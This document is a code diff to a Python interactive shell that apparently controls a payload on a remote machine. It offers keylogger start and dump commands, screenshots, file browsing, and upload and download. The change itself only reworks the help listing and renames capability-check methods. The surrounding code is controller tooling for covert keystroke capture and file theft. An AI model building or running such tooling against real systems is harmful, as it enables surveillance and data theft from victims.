@@ -18,6 +18,7 @@ from . import rpc
 class SessionCmd(cmd.Cmd):
     ruler = '-'
     nohelp = '*** {}'.format(Style.BRIGHT + Fore.RED + 'No help on %s' + Style.RESET_ALL)
+    unsup_header = 'Unsupported commands:'
 
     def __init__(self, session, *args, **kwargs):
         super().__init__(*args, **kwargs)
@@ -39,15 +40,46 @@ class SessionCmd(cmd.Cmd):
     def rpc(self):
         return self.session.rpc
 
-    def print_topics(self, header, cmds, cmdlen, maxcol):
-        _cmds = []
-        for c in cmds:
-            _c = c
-            if not self._command_supported(c):
-                _c = Style.BRIGHT + Fore.RED + '-' + c + Style.RESET_ALL
-            _cmds.append(_c)
-
-        return super().print_topics(header, _cmds, cmdlen, maxcol)
+    def do_help(self, arg):
+        'List available commands with "help" or detailed help with "help cmd".'
+        if arg:
+            return super().do_help(arg)
+        # copied from github cmd.py source code.
+        names = self.get_names()
+        cmds_doc = []
+        cmds_undoc = []
+        cmds_unsup = list()
+        help = {}
+        unsupported = list()
+        for name in names:
+            if name[:13] == 'requirements_':
+                if not self._command_supported(name[13:]):
+                    unsupported.append(name[13:])
+            elif name[:5] == 'help_':
+                help[name[5:]]=1
+        names.sort()
+        # There can be duplicates if routines overridden
+        prevname = ''
+        for name in names:
+            if name[:3] == 'do_':
+                if name == prevname:
+                    continue
+                prevname = name
+                cmd=name[3:]
+                if cmd in unsupported:
+                    cmds_unsup.append(cmd)
+                elif cmd in help:
+                    cmds_doc.append(cmd)
+                    del help[cmd]
+                elif getattr(self, name).__doc__:
+                    cmds_doc.append(cmd)
+                else:
+                    cmds_undoc.append(cmd)
+        self.stdout.write("%s\n"%str(self.doc_leader))
+        self.print_topics(self.doc_header, cmds_doc, 15, 80)
+        self.print_topics(self.misc_header, list(help.keys()), 15, 80)
+        self.print_topics(self.undoc_header, cmds_undoc, 15, 80)
+        self.print_topics(self.unsup_header, cmds_unsup, 15, 80)
 
     def columnize(self, list, displaywidth=80):
         n = 4
@@ -58,8 +90,8 @@ class SessionCmd(cmd.Cmd):
         supported = False
         if hasattr(self, 'do_' + name):
             supported = True
-        if hasattr(self, 'all_' + name):
-            cmd_dir = getattr(self, 'all_' + name)()
+        if hasattr(self, 'requirements_' + name):
+            cmd_dir = getattr(self, 'requirements_' + name)()
             sess_dir = self.session.dir()
             if not all(name in sess_dir for name in cmd_dir):
                 supported = False
@@ -143,7 +175,7 @@ class SessionCmd(cmd.Cmd):
 
 class PayloadSessionCmd(SessionCmd):
 
-    def all_keylogger(self):
+    def requirements_keylogger(self):
         return ['keylogger_start', 'keylogger_dump', 'keylogger_stop']
     
     def do_keylogger(self, line):
@@ -216,14 +248,14 @@ class PayloadSessionCmd(SessionCmd):
 
             print(key, end='')
 
-    def all_screenshot(self):
+    def requirements_screenshot(self):
         return ['screenshot']
 
     def do_screenshot(self, line):
         '''Take a screenshot of the remote machine.'''
         pass
 
-    def all_ls(self):
+    def requirements_ls(self):
         return ['list_dir', 'get_current_dir']
 
     def do_ls(self, line):
@@ -250,7 +282,7 @@ class PayloadSessionCmd(SessionCmd):
             self.columnize(listing)
             print()
 
-    def all_cd(self):
+    def requirements_cd(self):
         return ['change_dir']
 
     def do_cd(self, line):
@@ -265,14 +297,14 @@ class PayloadSessionCmd(SessionCmd):
         except NotADirectoryError:
             self.error('Not a directory: {}'.format(path))
 
-    def all_pwd(self):
+    def requirements_pwd(self):
         return ['get_current_dir']
 
     def do_pwd(self, line):
         '''Print the current working directory of the remote machine.'''
         print(self.rpc.get_current_dir())
     
-    def all_cat(self):
+    def requirements_cat(self):
         return ['open_file']
 
     def complete_cat(self, text, line, begidx, endidx):
@@ -298,7 +330,7 @@ class PayloadSessionCmd(SessionCmd):
         except (FileNotFoundError, IsADirectoryError) as e:
             self.error(str(e))
 
-    def all_upload(self):
+    def requirements_upload(self):
         return ['open_file', 'write_file']
 
     def do_upload(self, line):
@@ -333,7 +365,7 @@ class PayloadSessionCmd(SessionCmd):
                     progress.update(len(chunk))
         print('Upload complete.')
 
-    def all_download(self):
+    def requirements_download(self):
         return ['get_file_size', 'open_file', 'read_file']
 
     def do_download(self, line):
